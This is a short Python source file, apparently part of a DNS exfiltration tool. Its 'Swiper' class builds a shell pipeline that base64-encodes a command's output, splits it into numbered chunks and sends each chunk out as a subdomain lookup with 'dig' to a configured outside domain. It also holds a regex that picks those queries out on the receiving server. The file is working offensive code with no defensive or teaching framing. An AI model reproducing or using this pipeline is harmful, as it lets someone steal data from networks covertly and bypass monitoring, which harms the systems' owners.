import binascii
import re
import uuid


class Swiper:
    __INSTANCE = None

    def __init__(self, domain: str):
        host: bytes = domain.encode("ascii")
        host = host[:-1] if host[-1] == b"." else host
        host = host[1:] if host[0] == b"." else host
        self.schema = re.compile(rb"([a-zA-Z0-9_\-=]+).([0-9]+).([0-9a-fA-F]{32})\." + host + rb"\.")
        self.domain = host

    @staticmethod
    def instance(*args, **kwargs):
        if Swiper.__INSTANCE is None:
            Swiper.__INSTANCE = Swiper(*args, **kwargs)
        return Swiper.__INSTANCE

    @property
    def host(self):
        return self.domain.decode("ascii")

    @staticmethod
    def generate_context():
        return binascii.b2a_hex(uuid.uuid4().bytes).decode("ascii")

    def _generate_cmd(self, cmd: str, context: str):
        return f" | base64 -w 60 | cat -n | awk '{{$1=$1}};1' | sed 's/ /\\n/' | xargs -L 2 -n 2 bash -c '{cmd} $1.$0.{context}.{self.host}'"

    def generate_dig(self, context: str):
        return self._generate_cmd("dig", context)

    def dns_match(self, host: bytes):
        return self.schema.match(host)
